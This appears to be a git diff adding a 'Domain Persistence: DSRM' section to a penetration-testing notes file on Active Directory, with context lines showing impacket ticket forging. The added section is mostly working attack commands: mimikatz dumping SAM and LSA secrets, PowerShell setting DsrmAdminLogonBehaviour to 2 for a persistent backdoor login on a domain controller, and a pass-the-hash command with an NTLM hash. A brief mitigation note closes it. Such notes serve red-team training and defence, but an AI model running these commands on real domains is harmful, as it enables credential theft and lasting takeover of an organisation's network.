@@ -118,3 +118,48 @@ impacket-ticketer -nthash c6ba25c393c4e412825e6c476c7f2e12 \
 export KRB5CCNAME=Administrator.ccache
 impacket-smbclient MARVEL.LOCAL/Administrator@HYDRA-DC.marvel.local -k -no-pass
 ```
+
+
+#### Domain Persistence: DSRM
+A domain controller includes two Administrator accounts. LSASS manages the “AD Administrator Account,” which administrators use to log in to the domain controller. The system stores the other, a hard-coded “Local Administrator Account,” in its SAM database.
+
+All domain controllers have a hard-coded local Administrator account stored in their SAM file. Typically, this account and local database are not used or generally available when the domain controllers are running normally.
+```bash
+privilege::debug
+token::elevate
+
+#get the lsa and sam password and domain , domain controller administration account
+lsadump::sam
+lsadump::lsa /patch
+
+#look for this registry value
+DsrmAdminLogonBehaviour : 2
+
+#check the registry 
+Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
+
+if value = 0 so it's not working
+
+#set the registry value
+Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
+
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose
+
+#use sam password for pass the hash
+privilege::debug
+sekurlsa::pth /user:Administrator /domain:ignite.local /ntlm:32196B56FFE6F45E294117B91A83BF38
+
+
+
+#mitigation
+Check & monitor the DsrmAdminLogonBehaviour value is not set to 2 inside the Registry key.
+DSRM passwords are changed regularly at least once a month.
+
+ntdsutil
+set dsrm password
+reset password on server null
+# it will prompt for new password and confirmation
+q
+q
+```
+
